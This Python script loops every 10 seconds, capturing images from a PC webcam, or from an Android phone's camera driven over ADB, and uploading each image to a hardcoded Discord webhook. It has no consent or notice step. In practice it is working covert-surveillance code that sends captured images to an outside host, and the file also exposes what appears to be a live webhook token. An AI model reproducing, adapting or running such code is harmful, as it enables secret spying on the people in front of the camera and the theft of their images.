import os
import time
import threading
import platform
import requests
import cv2  # For PC camera access
from PIL import ImageGrab  # For PC screenshots
import subprocess

# Set the directory where screenshots will be saved
SCREENSHOT_DIR = "screenshots"
os.makedirs(SCREENSHOT_DIR, exist_ok=True)

# Discord webhook URL
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1290931457195380737/hMdVh5cnrXY0OaYReQzpgRVr6nsKnLztzgERCl5NEsm9XNxspJ_S0FpXSnHortA6AVi3"

def send_to_discord(file_path, location_info=None):
    """Send the screenshot or camera image along with location info to a Discord webhook."""
    content = "New image captured."
    if location_info:
        content += f"\n{location_info}"

    with open(file_path, 'rb') as f:
        response = requests.post(
            DISCORD_WEBHOOK_URL,
            files={"file": f},
            data={"content": content}
        )
    if response.status_code == 204:
        print(f"Image sent to Discord: {file_path}")
    else:
        print(f"Failed to send image to Discord: {response.status_code}, {response.text}")

def take_pc_image():
    """Continuously capture images using the PC camera every 10 seconds."""
    camera = cv2.VideoCapture(0)  # 0 is the default camera

    if not camera.isOpened():
        print("Webcam not accessible. Exiting.")
        return

    while True:
        ret, frame = camera.read()
        if ret:
            timestamp = time.strftime("%Y%m%d_%H%M%S")
            image_path = os.path.join(SCREENSHOT_DIR, f"pc_camera_image_{timestamp}.png")
            cv2.imwrite(image_path, frame)
            print(f"PC camera image saved at {image_path}")
            send_to_discord(image_path)
        else:
            print("Error: Could not read from webcam.")

        time.sleep(10)  # Capture image every 10 seconds

    camera.release()

def take_phone_image():
    """Continuously capture images using an Android phone's camera every 10 seconds."""
    while True:
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        camera_image_path = os.path.join(SCREENSHOT_DIR, f"phone_camera_image_{timestamp}.png")

        try:
            # Open the camera app and take a photo
            subprocess.run(["adb", "shell", "am", "start", "-a", "android.media.action.IMAGE_CAPTURE"], check=True)
            time.sleep(5)  # Wait for the camera app to open and capture the image
            subprocess.run(["adb", "shell", "input", "keyevent", "27"], check=True)  # Simulate pressing the shutter button
            time.sleep(2)  # Wait for the photo to be taken
            subprocess.run(["adb", "shell", "mv", "/sdcard/DCIM/Camera/*.jpg", f"/sdcard/{camera_image_path}"], check=True)
            subprocess.run(["adb", "pull", f"/sdcard/{camera_image_path}", camera_image_path], check=True)
            print(f"Phone camera image saved at {camera_image_path}")
            send_to_discord(camera_image_path)
        except subprocess.CalledProcessError as e:
            print(f"Error taking phone camera image: {e}")

        time.sleep(10)  # Capture image every 10 seconds

def main():
    # Detect the OS
    current_os = platform.system().lower()
    print(f"Detected OS: {current_os}")

    # Create and start the appropriate thread based on the OS
    if current_os == "windows":
        pc_thread = threading.Thread(target=take_pc_image, daemon=True)
        pc_thread.start()
        print("Started PC image capture thread.")
    else:
        # For Android screenshots, make sure ADB is connected and accessible
        phone_thread = threading.Thread(target=take_phone_image, daemon=True)
        phone_thread.start()
        print("Started phone image capture thread.")

    # Keep the main thread running to allow screenshots to continue
    try:
        while True:
            time.sleep(1)  # Keep the script running
    except KeyboardInterrupt:
        print("Image capturing stopped.")

if __name__ == "__main__":
    main()
